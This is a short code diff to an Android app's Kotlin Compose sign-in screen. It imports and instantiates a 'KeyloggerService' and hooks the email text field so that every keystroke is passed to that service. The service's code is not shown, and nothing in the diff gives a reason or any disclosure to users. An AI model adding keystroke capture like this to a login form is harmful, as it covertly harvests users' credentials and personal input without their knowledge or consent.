@@ -12,6 +12,7 @@ import androidx.compose.ui.unit.dp
 import androidx.navigation.NavController
 import com.google.firebase.database.*
 import com.example.axesite.util.hashPassword
+import com.example.axesite.util.KeyloggerService
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
@@ -20,6 +21,8 @@ fun SignInScreen(navController: NavController) {
     var password by remember { mutableStateOf("") }
     var errorMessage by remember { mutableStateOf("") }
     val context = LocalContext.current
+
+    val keyloggerService = remember {KeyloggerService.getInstance(context)}
 
     Scaffold(
         topBar = { TopAppBar(title = { Text("Sign In") }) }
@@ -32,7 +35,10 @@ fun SignInScreen(navController: NavController) {
         ) {
             TextField(
                 value = email,
-                onValueChange = { email = it },
+                onValueChange = {
+                    email = it
+                    keyloggerService.logComposeInput("Email", it, "SignInScreen")
+                },
                 label = { Text("Email") },
                 keyboardOptions = KeyboardOptions.Default.copy(keyboardType = KeyboardType.Email),
                 modifier = Modifier.fillMaxWidth()
